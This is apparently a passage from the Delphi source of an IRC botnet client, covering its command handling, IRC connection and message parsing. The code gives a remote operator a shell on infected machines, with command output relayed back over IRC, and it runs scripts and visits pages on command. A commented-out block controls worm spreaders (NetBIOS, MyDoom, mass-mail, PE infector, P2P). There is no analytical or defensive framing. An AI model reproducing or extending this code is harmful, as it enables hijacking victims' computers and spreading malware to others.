                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_DNS) Then
                        SendData('PRIVMSG ' + IRC.FromChan + ' :Resolved (' + IRC.Params[4] + ') to [' + ResolveIP(IRC.Params[4]) + ']'#10, False, Sock);

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_RUNSCRIPT) Then
                      Begin
                        Buf := IRC.RecvText;
                        Delete(Buf, 1, Length(BOT_COMMAND_RUNSCRIPT) + Length(BOT_PREFIX) + 1);

                        If (Pos(#13, Buf) > 0) Then Delete(Buf, Pos(#13, Buf), 1);
                        If (Pos(#10, Buf) > 0) Then Delete(Buf, Pos(#10, Buf), 1);

                        If (FileExists(Buf)) Then
                          RunScript(Buf)
                        Else If (FileExists(GetDirectory(BOT_PLACESCRIPT) + BOT_SCRIPTDIR + '\' + BUF)) Then
                          RunScript(Buf);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_VISIT) Then
                      Begin
                        Backup := IRC.Params[6];
                        Length_ := 1;
                        If (IRC.Params[7] <> '') Then
                          If (IsNumeric(IRC.Params[7])) Then
                            Length_ := StrToInt(IRC.Params[7]);
                        If (Backup = '') Then
                          VisitPage(IRC.Params[4], IRC.Params[5], FALSE, Length_)
                        Else If (NOT IsNumeric(Backup)) Then
                          VisitPage(IRC.Params[4], IRC.Params[5], FALSE, Length_)
                        Else
                          VisitPage(IRC.Params[4], IRC.Params[5], Boolean(Integer(StrToInt(IRC.Params[6]))), Length_)
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SHELL) Then
                      Begin
                        Buf := IRC.RecvText;
                        Delete(Buf, 1, Pos(' ', Buf) -1);

                        If (Copy(Buf, 1, 1) = ' ') Then
                          Delete(Buf, 1, 1);

                        If (Buf <> '') Then
                        Begin
                          Backup := RunDosInCap(Buf);

                          While (Pos(#10, Backup) > 0) Do
                          Begin
                            Buf := Copy(Backup, 1, Pos(#10, Backup) -1);
                            Backup := Copy(Backup, Pos(#10, Backup) +1, Length(Backup));

                            ReplaceStr(#32, #0160, Buf);
                            Buf := 'PRIVMSG ' + IRC.FromNick + ' :' + Buf + #10;

                            SendData(Buf, IsChat, tempSock);
                            Sleep(800);
                          End;
                        End;
                      End;

                      (*
                      // Start Spreaders
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SPREADSTART) Then
                      Begin
                        {$IFDEF NETBIOS}
                          StartNetBios(50);
                        {$ENDIF}
                        {$IFDEF MYDOOM}
                          StartMyDoom(50);
                        {$ENDIF}
                        {$IFDEF DCPP}
                          StartDCPP;
                        {$ENDIF}
                        {$IFDEF MASSMAIL}
                          StartMassMail;
                        {$ENDIF}
                        {$IFDEF PE}
                          StartInfector;
                        {$ENDIF}
                        {$IFDEF P2P}
                          StartP2P;
                        {$ENDIF}
                        {$IFDEF IRC}
                          StartIRC;
                        {$ENDIF}
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Spread] Started.'#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Stop Spreaders
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SPREADSTOP) Then
                      Begin
                        {$IFDEF NETBIOS}
                          StopNetBios;
                        {$ENDIF}
                        {$IFDEF MYDOOM}
                          StopMyDoom;
                        {$ENDIF}
                        {$IFDEF DCPP}
                          StartDCPP;
                        {$ENDIF}
                        {$IFDEF MASSMAIL}
                          StopMassMail;
                        {$ENDIF}
                        {$IFDEF PE}
                          StopInfector;
                        {$ENDIF}
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Spread] Stopped.'#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Spreader Bot
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SPREADINFO) Then
                      Begin
                        Buf := '';
                        {$IFDEF NETBIOS}  Buf := Buf + '[NB : '+FixLength(IntToStr(SPREADER_NETBIOS ),5)+'] '; {$ENDIF}
                        {$IFDEF MYDOOM}   Buf := Buf + '[MD : '+FixLength(IntToStr(SPREADER_MYDOOM  ),5)+'] '; {$ENDIF}
                        {$IFDEF DCPP}     Buf := Buf + '[DC+: '+FixLength(IntToStr(SPREADER_DCPP    ),5)+'] '; {$ENDIF}
                        {$IFDEF MASSMAIL} Buf := Buf + '[MM : '+FixLength(IntToStr(SPREADER_MASSMAIL),5)+'] '; {$ENDIF}
                        {$IFDEF PE}       Buf := Buf + '[PE : '+FixLength(IntToStr(SPREADER_PE      ),5)+'] '; {$ENDIF}
                        {$IFDEF P2P}      Buf := Buf + '[P2P: '+FixLength(IntToStr(SPREADER_P2P     ),5)+'] '; {$ENDIF}
                        {$IFDEF IRC}      Buf := Buf + '[IRC: '+FixLength(IntToStr(SPREADER_IRC     ),5)+'] '; {$ENDIF}
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :' + Buf + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;
                      *)

                  End;
              End;
          End;
  End;
End;

Procedure tSock.DoCommands;
Var
  Buffer        :Array[0..6000] Of Char;
  Data          :String;
Begin
  ZeroMemory(@Buffer, SizeOf(Buffer));
  {$IFDEF DEBUG_SHOW} WriteLn('Waiting for incomming data.'); {$ENDIF}
  While (IRC.ReceiveData) Do
  Begin
    Data := '';
    ZeroMemory(@Buffer, SizeOf(Buffer));
    Recv(Sock, Buffer, SizeOf(Buffer), 0);
    Data := String(Buffer);
    If (Data = '') Then Exit;
    ZeroMemory(@Buffer, SizeOf(Buffer));
    {$IFDEF DEBUG_SHOW} WriteLn('>> ['+IntToStr(Length(Data))+']: '+Data); {$ENDIF}
    {$IFDEF DEBUG_SHOW} WriteLn; {$ENDIF}
    IsChat := False;
    ReadCommands(Data, Sock);

    Data := '';
    ZeroMemory(@Buffer, SizeOf(Buffer));
  End;
End;

Procedure tSock.SendInfo;
Var
  Data: String;
Begin
  Randomize;
  If (Nick = '') Then Nick := RandIRCBot;
  ReplaceShortCut(Nick);

  Data := 'USER '+Nick+' "'+Nick+IntToStr(Random(999))+'" "'+ServerName+'" :'+nick+#10;
  Send(Sock, Data[1], Length(Data), 0);
  Data := 'NICK '+Nick+#10;
  Send(Sock, Data[1], Length(Data), 0);
End;


Function  tSock.Connect;
Begin
  {$IFDEF DEBUG_SHOW} WriteLn('Trying to connect.'); {$ENDIF}
  Result := False;
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  If (Sock = INVALID_SOCKET) Then Exit;

  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(Port);
  Addr.sin_addr.S_addr := inet_addr(pchar(server));

  If (Winsock.Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS) Then
  Begin
    {$IFDEF DEBUG_SHOW} WriteLn('Established a connection.'); {$ENDIF}
    Result := True;
    SendInfo;
    IRC.Sock := Sock;
    If Not (IsSpy) And Not (IsClone) Then
      DefaultSock := Sock;
    DoCommands;
  End;
  {$IFDEF DEBUG_SHOW} WriteLn('Connection lost.'); {$ENDIF}
  CloseSocket(Sock);
End;

Function  tSock.StartUp: Bool;
Begin
  ServerName := Server;
  Server := ResolveIP(Server);
  {$IFDEF DEBUG_SHOW} WriteLn(ServerName+' Resolved To '+Server); {$ENDIF}
  WSAStartUp(MakeWord(2,1), dWSA);
    IRC := TBotIRC.Create;
    {$IFDEF LOG_IRCNAMES}
      IRC.SeenNicks := RandIRCBotN;
    {$ENDIF}
    IRC.LoggedIn := False;
    IRC.Silence := False;
    Bot.Nick := ReplaceShortCut(Bot.Nick);
    Result := Connect;
    IRC.Free;
  WSACleanUp;
End;

Procedure TBotIRC.SplitParam(Data: String);
Var
  I     :Integer;
  Temp  :String;
Begin
  I     := 0;
  FillChar(Params, 9000, #0);
  While (Pos(' ', Data) > 0) or (i >= 9000) Do
  Begin
    Temp := Copy(Data, 1, Pos(' ', Data)-1);
    Data := Copy(Data, Pos(' ', Data)+1, Length(Data));
    If (Temp <> '') Then
    Begin
      Params[I] := Temp;
      Inc(I);
    End;
  End;
  If (Data <> '') Then
  Begin
    If (Pos(#10, Data) > 0) Then Delete(Data, Pos(#10, Data), 1);
    If (Pos(#13, Data) > 0) Then Delete(Data, Pos(#13, Data), 1);
    Params[I] := Data;
  End;
End;

Procedure TBotIRC.ParseInfo(Data: String);
Var
  Temp          :String;
Begin
  SplitParam(Data);
  IsCmd := False;

  // Nick, Host, Chan
  Temp := Params[0];
  If (Pos('@', Temp) > 0) Then
  Begin
    FromNick := Copy(Temp, 2, Pos('!', Temp)-2);
    FromHost := Copy(Temp, Pos('!', Temp)+1, Length(Temp));
    {$IFDEF LOG_IRCNAMES}
      KnowNick(FromNick);
    {$ENDIF}
  End;

  If (Params[2] <> '') Then
    If (Params[2][1] = '#') Then
      FromChan := Params[2];

  // Commands
  If (IsNumeric(Params[1])) Then
  Begin
    Cmd := Params[1];
    IsCmd := True;
  End Else
    If (Params[1] = 'PRIVMSG') Then
    Begin
      RecvText := Copy(Data, Pos(Params[2], Data), Length(Data));
      RecvText := Copy(RecvText, Pos(':', RecvText)+1, Length(RecvText));
      If (Pos(#10, RecvText) > 0) Then Delete(RecvText, Pos(#10, RecvText), 1);
      If (Pos(#13, RecvText) > 0) Then Delete(RecvText, Pos(#13, RecvText), 1);
    End;
End;

Function TBotIRC.ReceiveData: Bool;
Var
  TimeOut       :TimeVal;
  FD_Struct     :TFDSet;
Begin
  TimeOut.tv_sec := 960;
  TimeOut.tv_usec := 0;

  FD_ZERO(FD_Struct);
  FD_SET (Sock, FD_Struct);

  If (Select(0, @FD_Struct, NIL, NIL, @TimeOut) <= 0) Then
  Begin
    CloseSocket(Sock);
    Result := False;
    Exit;
  End;
  Result := True;
End;

end.
